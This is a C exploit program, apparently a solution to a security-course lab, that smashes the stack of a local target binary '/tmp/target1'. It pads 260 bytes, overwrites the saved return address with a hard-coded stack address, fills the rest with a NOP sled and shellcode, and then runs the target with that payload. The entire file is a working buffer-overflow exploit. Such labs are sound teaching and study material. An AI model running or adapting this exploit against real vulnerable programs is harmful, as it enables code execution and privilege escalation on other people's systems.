#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define PAYLOAD_SIZE (4096) // A LOT!
#define RET_OFFSET (256 + 4) // 256 bytes of buffer + 4 bytes of base pointer
#define NOP 0x90 // https://www.felixcloutier.com/x86/nop
#define DUMMY 'A'

int main(void)
{
	unsigned int stack_address = 0xbfffef18; // this is the place which argv[1] will be put
	printf("Using %p as return address\n", stack_address);
	char *payload = malloc(PAYLOAD_SIZE);
	memset(payload, NOP, PAYLOAD_SIZE); // fill the payload with nop
	memset(payload, DUMMY, RET_OFFSET); // fill with dummy for debug
	memcpy(payload + RET_OFFSET, &stack_address, sizeof(stack_address)); // put the return address at the right spot
	memcpy(payload + PAYLOAD_SIZE - sizeof(shellcode) - 1, shellcode, sizeof(shellcode) - 1); // -1 to do not copy the null terminator
	payload[PAYLOAD_SIZE - 1] = '\0';
	// Put the payload in a file for debug
	FILE* payload_file = fopen("sploit1-payload.bin", "wb");
	fwrite(payload, 1, PAYLOAD_SIZE, payload_file);
	fclose(payload_file);
	// Run the program
	char *args[] = { TARGET, payload, NULL };
	char *env[] = { NULL };

	execve(TARGET, args, env);
	fprintf(stderr, "execve failed.\n");

	return 0;
}
